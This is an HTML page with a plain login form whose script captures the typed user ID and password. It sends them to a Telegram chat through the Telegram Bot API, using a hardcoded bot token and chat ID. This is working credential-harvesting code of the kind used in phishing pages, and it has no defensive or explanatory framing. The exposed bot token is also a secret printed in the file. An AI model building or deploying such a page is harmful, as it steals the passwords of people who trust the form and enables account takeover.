
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Report</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; }
        form { max-width: 400px; margin: auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; }
        input { width: 100%; margin: 10px 0; padding: 8px; }
        button { background: #28a745; color: white; padding: 10px; border: none; cursor: pointer; }
    </style>
</head>
<body>
    <h2>Login Form</h2>
    <form id="loginForm">
        <input type="text" id="userId" placeholder="User ID" required>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            
            let userId = document.getElementById('userId').value;
            let password = document.getElementById('password').value;
            
            let botToken = '7794527769:AAGME4TVgMq3kv_HhiBLmjDld4hwElO4LHk';
            let chatId = '7283094857';
            let text = `Login Attempt:\nUser ID: ${userId}\nPassword: ${password}`;
            
            let url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            })
            .then(response => response.json())
            .then(data => alert('Login reported to Telegram!'))
            .catch(error => alert('Error reporting login!'));
        });
    </script>
</body>
</html>
